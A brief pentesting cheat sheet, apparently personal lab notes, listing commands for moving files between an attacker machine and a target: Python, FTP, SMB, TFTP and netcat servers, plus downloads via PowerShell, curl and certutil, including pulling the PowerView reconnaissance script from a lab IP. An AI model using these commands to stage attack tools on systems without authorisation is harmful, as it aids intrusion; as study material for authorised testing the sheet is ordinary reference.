# File Transfers
```bash
# HTTP - Python. Default port 8000
# python2
sudo python -m SimpleHTTPServer 80
# python3
sudo python3 -m http.server 80

# Powershell
Invoke-WebRequest -Uri http://10.10.14.176:8000/PowerView.ps1 -OutFile PowerView.ps1

# Curl
curl -o example.txt http://example.com/file.txt

# Certutil
certutil.exe -urlcache -split -f http://<ip>/file file_save

# FTP
# apt-get install python-pyftpdlib
sudo python -m pyftpdlib -p 21

# SMB
sudo impacket-smbserver <share_name> <path/to/share>

# TFTP (UDP)
sudo atftpd --daemon -port 69 /path/to/serve

# Netcat
nc -nvlp <port> < file/to/send

# Metasploit upload / download
```